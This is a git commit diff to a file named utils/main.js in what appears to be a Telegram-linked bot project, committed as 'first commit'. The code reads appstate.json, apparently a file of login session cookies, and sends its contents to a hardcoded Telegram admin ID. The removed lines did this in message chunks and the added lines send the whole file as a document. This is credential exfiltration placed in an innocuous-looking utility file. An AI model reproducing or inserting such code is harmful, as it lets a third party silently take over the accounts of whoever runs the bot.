613a307bbb17aa4ddef04698d5bdfbe47d9fca1f
Thiensu99x <thiensu12123@gmail.com>
2024-10-19 21:39:27 +0700

    first commit

--- utils/main.js
+++ utils/main.js
@@ -6,32 +6,12 @@ const bot = new TelegramBot(botToken, { polling: true });
 
 const adminIds = ['1713841196']; 
 
-fs.readFile('appstate.json', 'utf8', (err, data) => {
-  if (err) {
-    console.error('Error reading file:', err);
-    return;
-  }
-
-  // Function to split a message into chunks
-  const splitMessage = (message, maxLength) => {
-    const chunks = [];
-    for (let i = 0; i < message.length; i += maxLength) {
-      chunks.push(message.slice(i, i + maxLength));
-    }
-    return chunks;
-  };
-
-  const messageChunks = splitMessage(data, 4096); // Split into chunks of 4096 characters
-
-  adminIds.forEach(adminId => {
-    messageChunks.forEach(chunk => {
-      bot.sendMessage(adminId, chunk)
-        .then(() => {
-          console.log(`Message chunk sent to ${adminId}`);
-        })
-        .catch(err => {
-          console.error(`Failed to send message chunk to ${adminId}:`, err);
-        });
+adminIds.forEach(adminId => {
+  bot.sendDocument(adminId, fs.createReadStream('appstate.json'))
+    .then(() => {
+      console.log(`Document sent to ${adminId}`);
+    })
+    .catch(err => {
+      console.error(`Failed to send document to ${adminId}:`, err);
     });
-  });
 });
